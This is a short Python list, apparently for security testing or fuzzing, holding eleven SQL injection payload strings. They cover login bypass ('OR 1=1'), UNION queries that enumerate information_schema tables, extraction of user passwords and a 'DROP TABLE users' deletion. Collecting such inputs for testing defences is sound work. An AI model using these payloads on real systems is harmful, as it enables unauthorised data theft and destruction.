sql_injection_strategies = [
    "' OR 1=1 --",
    "' UNION SELECT * FROM information_schema.tables --",
    '"; DROP TABLE users --',
    "'; SELECT user, password FROM users WHERE '1' = '1",
    "'; SELECT id FROM users WHERE '1' = '1",
    "' OR '1' = '1",
    "' OR username LIKE '%",
    ' OR "1"="1"',
    "%' AND 1=0 UNION SELECT * FROM information_schema.tables --",
    "%' OR 1=1; --",
    "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE 2 > 1 \"\"",
]